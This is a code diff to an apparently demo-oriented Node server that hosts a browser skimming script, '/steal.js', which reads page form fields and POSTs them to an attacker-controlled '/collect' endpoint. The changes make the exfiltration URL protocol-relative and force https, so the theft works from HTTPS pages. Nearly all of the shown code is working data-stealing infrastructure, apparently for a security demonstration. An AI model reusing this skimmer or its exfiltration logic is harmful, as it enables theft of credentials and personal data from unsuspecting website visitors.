@@ -23,26 +23,29 @@ function forwardedHost(req) {
 }
 
 function normalizeLegacyOrigin(legacy) {
-  const href = /^https?:\/\//i.test(legacy) ? legacy : `http://${legacy}`;
+  const href = /^https?:\/\//i.test(legacy) ? legacy : `https://${legacy}`;
   try {
     const u = new URL(href.replace(/\/$/, ''));
-    return `${u.protocol}//${u.host}`;
+    return `//${u.host}`;
   } catch (_) {
     return legacy.replace(/\/$/, '');
   }
 }
 
-function buildOriginWithOptionalPort(proto, host) {
-  let origin = `${proto}://${host}`;
+function buildProtocolRelativeBase(hostRaw) {
   const pubPort = (
     process.env.ATTACKER_PUBLIC_PORT ||
     process.env.EXTERNAL_ATTACKER_PORT ||
     ''
   ).trim();
+  let hostPart =
+    typeof hostRaw === 'string'
+      ? hostRaw.split(',')[0].trim()
+      : '';
   if (pubPort && pubPort !== '80' && pubPort !== '443') {
-    origin += `:${pubPort}`;
+    hostPart += `:${pubPort}`;
   }
-  return origin;
+  return `//${hostPart}`;
 }
 
 /**
@@ -57,18 +60,17 @@ function getPublicAttackerOrigin(req) {
     return normalizeLegacyOrigin(legacy);
   }
 
-  const proto = forwardedProto(req);
   const host =
     forwardedHost(req) ||
     (process.env.ATTACKER_DOMAIN || '').trim();
   if (host) {
-    return buildOriginWithOptionalPort(proto, host);
+    return buildProtocolRelativeBase(host);
   }
 
   if (legacy) {
     return normalizeLegacyOrigin(legacy);
   }
-  return `${proto}://127.0.0.1:${PORT}`;
+  return `//127.0.0.1:${PORT}`;
 }
 
 const DEFAULT_ORIGIN_SUFFIXES = ['fortinet.demo', 'packetsoprano.com'];
@@ -150,6 +152,18 @@ app.get('/steal.js', (req, res) => {
   res.send(`
 (function() {
   var target = ${JSON.stringify(baseUrl)};
+
+  function collectOrigin() {
+    try {
+      var u = new URL(target, window.location.href);
+      if (window.location.protocol === 'https:' && u.protocol === 'http:') {
+        u.protocol = 'https:';
+      }
+      return u.origin;
+    } catch (e) {
+      return target;
+    }
+  }
   
   function getFieldValue(id, name) {
     var el = document.getElementById(id);
@@ -159,7 +173,7 @@ app.get('/steal.js', (req, res) => {
   
   function send(data) {
     try {
-      fetch(target + '/collect', {
+      fetch(collectOrigin() + '/collect', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(data)
